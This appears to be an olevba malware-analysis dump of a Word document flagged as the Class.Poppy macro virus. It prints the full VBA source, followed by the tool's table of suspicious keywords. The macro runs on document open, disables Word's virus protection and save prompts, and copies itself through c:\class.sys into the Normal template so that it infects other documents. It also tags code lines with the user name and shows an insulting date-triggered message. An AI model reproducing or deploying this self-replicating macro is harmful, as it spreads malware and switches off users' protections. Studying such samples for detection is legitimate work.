olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-1289063599fa4b38094da574eb16f2efd153b31a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-1289063599fa4b38094da574eb16f2efd153b31a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
On Error GoTo out
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
Options.VirusProtection = False
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
Options.SaveNormalPrompt = False
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
Options.ConfirmConversions = False
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
If nt > 70 And ad > 0 Then GoTo out
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
If nt < 70 Then
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
End If
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
host.codemodule.AddFromFile ("c:\class.sys")
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
With host.codemodule
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    For x = 1 To 4
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    .deletelines 1
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    Next x
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
End With
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
If nt < 70 Then
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    With host.codemodule
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    .replaceline 1, "Sub AutoClose()"
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    .replaceline 71, "Sub ToolsMacro()"
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    End With
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
End If
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
With host.codemodule
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    For x = 2 To 72 Step 2
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
    Next x
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
End With
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
out:
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
End Sub
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
Sub ViewVBCode()
'Ditry PC2/19/99 8:41:26 AMHP LaserJet 4 on LPT1:sample1
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

